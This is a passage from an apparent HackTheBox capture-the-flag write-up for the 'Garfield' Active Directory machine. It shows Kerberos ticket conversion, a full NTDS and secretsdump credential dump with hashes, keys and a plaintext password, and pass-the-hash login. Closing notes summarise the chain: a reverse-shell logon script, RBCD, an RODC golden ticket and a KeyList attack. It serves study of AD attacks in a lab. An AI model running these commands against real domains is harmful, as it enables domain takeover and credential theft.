jt6gdfBz7MfYQ1g/YrhWlZO8615Nsg2SNDc+tORcOBoKVvztkzIhrYj0Y3PW9AgXwHP+y+B7DuvcSJOFOFmMgSab8DxDeZVfklwqu3NnYiI4/+YSKP0EaT+nywoRNj80fE6/RyhIpfCp+vr3A4R/OUGce4HuCy7MGH2gGUgNf+UAnt/Spitl+K2CDWvf2bPifu4onkQqEeq6gDBuCpg3RhC3V708ui1Y/XU60PTl86YUC/olvPs5b/7x2BGjgdgwgdWgAwIBAKKBzQSByn2BxzCBxKCBwTCBvjCBu6ArMCmgAwIBEqEiBCCaNtJkPh74iHPU/s3pVL382i/S7fZ4SNpChJusjRnQWqEOGwxHQVJGSUVMRC5IVEKiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQAAAQAApREYDzIwMjYwNDA4MDQyNTQ4WqYRGA8yMDI2MDQwODE0MjUyNFqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxHQVJGSUVMRC5IVEI=

  ServiceName              :  krbtgt/GARFIELD.HTB
  ServiceRealm             :  GARFIELD.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  GARFIELD.HTB
  StartTime                :  4/7/2026 9:25:48 PM
  EndTime                  :  4/8/2026 7:25:24 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  mjbSZD4e+Ihz1P7N6VS9/Nov0u32eEjaQoSbrI0Z0Fo=
  Password Hash            :  EE238F6DEBC752010428F20875B092D5

```

- I copy the base64 ticket into a file `ticket.b64`
- Then I convert it to kirbi:
```
sed -i 's/^[[:space:]]*//' ticket.b6
tr -d '\r\n\t ' < ticket.b64 | base64 -d > ticket.kirbi
xxd -l 8 ticket.kirbi

---OUTPUT---
00000000: 7682 059e 3082 059a                      v...0...
```

- Convert this ticket to ccache:
```
impacket-ticketConverter ticket.kirbi ticket.ccache 
export KRB5CCNAME=ticket.ccache 
echo $KRB5CCNAME
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
ticket.ccache

```

- Finally dump the Administrator's hash:
```
faketime "+8hours" nxc smb DC01.garfield.htb --use-kcache --ntds
SMB         DC01.garfield.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC01.garfield.htb 445    DC01             [+] GARFIELD.HTB\Administrator from ccache (Pwn3d!)
SMB         DC01.garfield.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         DC01.garfield.htb 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5:::                                                                                                              
SMB         DC01.garfield.htb 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                      
SMB         DC01.garfield.htb 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:077a59724e58efbf6608853652a66f80:::                                                                                                                     
SMB         DC01.garfield.htb 445    DC01             krbtgt_8245:1603:aad3b435b51404eeaad3b435b51404ee:445aa4221e751da37a10241d962780e2:::                                                                                                               
SMB         DC01.garfield.htb 445    DC01             garfield.htb\j.arbuckle:3101:aad3b435b51404eeaad3b435b51404ee:f705091e5d14d5c25ace5f52ea4d8ecb:::                                                                                                   
SMB         DC01.garfield.htb 445    DC01             garfield.htb\l.wilson:3105:aad3b435b51404eeaad3b435b51404ee:dc6e2c16d8baac7cc239f160783ae2b0:::                                                                                                     
SMB         DC01.garfield.htb 445    DC01             garfield.htb\l.wilson_adm:3107:aad3b435b51404eeaad3b435b51404ee:c24a5d45e2ec8995b02de7039be19d3e:::                                                                                                 
SMB         DC01.garfield.htb 445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:22acecfd924465afc92bf3c3631bbc91:::                                                                                                                     
SMB         DC01.garfield.htb 445    DC01             RODC01$:1602:aad3b435b51404eeaad3b435b51404ee:0a3f810964bb5e1f0e52245f73700172:::                                                                                                                   
SMB         DC01.garfield.htb 445    DC01             hax0r$:10601:aad3b435b51404eeaad3b435b51404ee:823583fb65eddc4b2f5e9f7db6bc9834:::                                                                                                                   
SMB         DC01.garfield.htb 445    DC01             FAKE$:10602:aad3b435b51404eeaad3b435b51404ee:c16909555f24a7787bf9fb53310fcb84:::                                                                                                                    
SMB         DC01.garfield.htb 445    DC01             [+] Dumped 11 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_DC01.garfield.htb_2026-04-08_003244.ntds of which 7 were added to the database
SMB         DC01.garfield.htb 445    DC01             [*] To extract only enabled accounts from the output file, run the following command:
SMB         DC01.garfield.htb 445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_DC01.garfield.htb_2026-04-08_003244.ntds | cut -d ':' -f1

```
- Alternatively can use `secretsdump`:
```
faketime "+8hours" impacket-secretsdump -k -no-pass DC01.garfield.htb             
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x3eeaa6e0c8c5b5be0c19c58f0c71f014
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
GARFIELD\DC01$:plain_password_hex:0bdfc156535660c8292b7b8a98c74544c56e4ba4944fa6e2150a4afb9385236bbbbfe84d92e193acec79d1b12ef2019da135b8cb27f53c7728715e75b21b8c484716563e0b6bb02113fadd9417ed27aee068731fdb0ec42881751ddf660f3c7b29cc00d49173587c73f3858663a7dc19bd8a3de284ce59d2f55018ff5209996c75fa848c8a3673b5c102e0ecac2907ed348a93433629d2b9a0d6897577f9327b1b5f3bb298b51c5c0e2ba43b6681a3e378a05c66dad3ae956c476a1016e2d8296d1242e7303d08f5507dbecd8c8d7511faba0447ab4239000327b11831bbb81dac956f4f7f528df6a47718a955c4cb76
GARFIELD\DC01$:aad3b435b51404eeaad3b435b51404ee:22acecfd924465afc92bf3c3631bbc91:::
[*] DefaultPassword 
GARFIELD\Administrator:lgoSWZnv0phWaNFu
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x2846306ece4ab4cf7f560eb78abd9a7a91a5547b
dpapi_userkey:0x23ff54708c0bc15ea32ef626ea611b79dbc65ae6
[*] NL$KM 
 0000   1C 9C 0A 77 63 CF 69 B8  B0 9E E4 5A 30 17 EF B0   ...wc.i....Z0...
 0010   1D C0 BD DE DD C1 B0 12  74 62 5B 89 5F 10 96 F5   ........tb[._...
 0020   CE 7C EE 70 68 FE 49 CA  C1 38 CC 41 D8 88 C9 99   .|.ph.I..8.A....
 0030   EE 0B 37 47 A1 43 F0 C3  B5 9A FB DE C1 A1 0A BB   ..7G.C..........
NL$KM:1c9c0a7763cf69b8b09ee45a3017efb01dc0bddeddc1b01274625b895f1096f5ce7cee7068fe49cac138cc41d888c999ee0b3747a143f0c3b59afbdec1a10abb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:077a59724e58efbf6608853652a66f80:::
krbtgt_8245:1603:aad3b435b51404eeaad3b435b51404ee:445aa4221e751da37a10241d962780e2:::
garfield.htb\j.arbuckle:3101:aad3b435b51404eeaad3b435b51404ee:f705091e5d14d5c25ace5f52ea4d8ecb:::
garfield.htb\l.wilson:3105:aad3b435b51404eeaad3b435b51404ee:dc6e2c16d8baac7cc239f160783ae2b0:::
garfield.htb\l.wilson_adm:3107:aad3b435b51404eeaad3b435b51404ee:c24a5d45e2ec8995b02de7039be19d3e:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:22acecfd924465afc92bf3c3631bbc91:::
RODC01$:1602:aad3b435b51404eeaad3b435b51404ee:0a3f810964bb5e1f0e52245f73700172:::
hax0r$:10601:aad3b435b51404eeaad3b435b51404ee:823583fb65eddc4b2f5e9f7db6bc9834:::
FAKE$:10602:aad3b435b51404eeaad3b435b51404ee:c16909555f24a7787bf9fb53310fcb84:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:53b9e15b84f5b44ca093b5a74098b26aae113a806a9a7ff647754dc6518e9c29
Administrator:aes128-cts-hmac-sha1-96:f0aaabf4238c8cb0cf30b123d15bc579
Administrator:des-cbc-md5:ce8067135851fdf1
krbtgt:aes256-cts-hmac-sha1-96:d11af60335016c1fb36af5f3a25932c669c776c7243f914e1c5639e910fbf165
krbtgt:aes128-cts-hmac-sha1-96:ef164918a0f52610a330572738133040
krbtgt:des-cbc-md5:323251d089c21589
krbtgt_8245:aes256-cts-hmac-sha1-96:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
krbtgt_8245:aes128-cts-hmac-sha1-96:124c0fd09f5fa4efca8d9f1da91369e5
krbtgt_8245:des-cbc-md5:d540fe6192b9ecfe
garfield.htb\j.arbuckle:aes256-cts-hmac-sha1-96:020479792c08b7ee98ea331fa17af63803127802cf9520270d41938bd4936564
garfield.htb\j.arbuckle:aes128-cts-hmac-sha1-96:3ca4723b81074249aaedf0c357466145
garfield.htb\j.arbuckle:des-cbc-md5:a4458994c2d508fd
garfield.htb\l.wilson:aes256-cts-hmac-sha1-96:1c7e4d672823d23306eae6a9342983998b73c6c7434aca0c01f5444bda3644f9
garfield.htb\l.wilson:aes128-cts-hmac-sha1-96:f9ebfbbedca92fa54796434b51bb1c6a
garfield.htb\l.wilson:des-cbc-md5:6b2f2a6efdd90729
garfield.htb\l.wilson_adm:aes256-cts-hmac-sha1-96:8c036c2c26c164fa7bc80d8f775f5230877fcb1188b39c65114c525cf8812da8
garfield.htb\l.wilson_adm:aes128-cts-hmac-sha1-96:5aac02a8a27930507ba6c3f4d4a74955
garfield.htb\l.wilson_adm:des-cbc-md5:f7e5cb7007e0ab76
DC01$:aes256-cts-hmac-sha1-96:ea74859383fcf96a2b1b6b5ba4a19fe3984836fb6b6a9ae4aa20cf601f64aa7f
DC01$:aes128-cts-hmac-sha1-96:155ce5da0fdfd37dd81fc3ce057af4e5
DC01$:des-cbc-md5:8fd05434929ef791
RODC01$:aes256-cts-hmac-sha1-96:53f207641615eef3b3235d9b2ee9dfa47dcec7c05d46393958031eaee42eda22
RODC01$:aes128-cts-hmac-sha1-96:52432a8bdb5b11e64f3c9f53ef712b50
RODC01$:des-cbc-md5:469715524c1c02df
hax0r$:aes256-cts-hmac-sha1-96:0978787d564efc38501f1503698eb84cb36c58ddab514436c962f7d2219c53b2
hax0r$:aes128-cts-hmac-sha1-96:35259e357fd5a68e4ca8e93c16f38483
hax0r$:des-cbc-md5:ea9485f723dc4349
FAKE$:aes256-cts-hmac-sha1-96:05deda42b1c9b65dabc4bef9ddc987341b3cfa0ebe1cbd2f07de59963ef7c74c
FAKE$:aes128-cts-hmac-sha1-96:84c543608e09fa86802f4232150e8e8b
FAKE$:des-cbc-md5:8c9b61616bce165d
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

- Finally we can log in to the DC01 as administrator with the hash:
```
evil-winrm -i 10.129.25.184 -u Administrator -H 'ee238f6debc752010428f20875b092d5'
```
![[Pasted image 20260407165139.png]]

- I get the root flag:
![[Pasted image 20260407165204.png]]



### Final Notes
- Initial foothold was an exploit that sets a `scriptPath` attribute for a user. First we use the bloodyAD command to see what attributes the user we have can modify of other users. We see a user l.wilson. From here we set a `scriptPath` for the user and from the smb share SYSVOL where there is a scripts folder we alter it to hold our reverseshell payload. After changing the scriptPath and uploading the malicious payload replacing the original one, we get a shell on our listener.
- Then looking at bloodhound we see we can reset the Password of `l.wilson_adm`. Initially the first command I try didn't work..I believe it was a net user command as well as one other. But the `Set-ADAccountPassword` works.
- I then login as `l.wilson_adm` and grab user flag. 
- Checking the IP I see there is an internal IP set.
- Looking at bloodhound `l.wilson_adm` can add itself to a group and force change password to an `RODC01`. I ping that name to find the IP. Also RODC01 is basically a DC but with only Read privileges so its hardened.
- I then add myself to the RODC Administrators group (as `l.wilson_adm`). ***I need to login again for this change to take effect. This is important especially for the end***
- I then create a tunnel to reach the internal IP via ligolo. 
- Checking my privileges I can set Machine Account privileges. and I am Tier 1 group.
- I then create a machine account with `impacket-addcomputer` with my credentials 
- Then back on the winrm session I set this machine account with a privilege to allow to delegate. RBCD is now configured.

-  Using this machine account I can now request a Service Ticket as Administrator for RODC01 using `impacket-getST`
- Then I can use this ticket to login to RODC01 as Adminsitrator.
- Furthermore if I check the users via `nxc smb` I see `krbtgt_8245` this is the krbtgt user for RODC01 (whcih is seperate from `krbtgt` of DC01)
- Now I am Admin in RODC01 I can use mimikatz to dump the AES256 hash of `krbtgt_8245` as well as get the SID and ROD number (8245) This is for the KeyList Attack for RODCs
- Using this I can try to do a golden ticket attack.
- But first I need to allow Administrator Replication policy on RODC01.
- Make sure our session is part of RODC Adminsitrators (`l.wilson_adm` on DC01) and we alter the RevealOnDemand property of RODC01 to include Administrator. We also clear everything on NeverRevealGroup
- Finally with the permissions set, I can use Rubeus to forge an RODC Golden ticket.
- This kirbi ticket is then used to perform a KeyList Attack (with Rubeus itself, asktgs)
- The b64 ticket is converted to ccache and using this ticket I can dump the hashes via secretsdump or nxc
- I can then take the admin hash and login to DC01
https://www.thehacker.recipes/ad/movement/builtins/rodc
- And sources from link above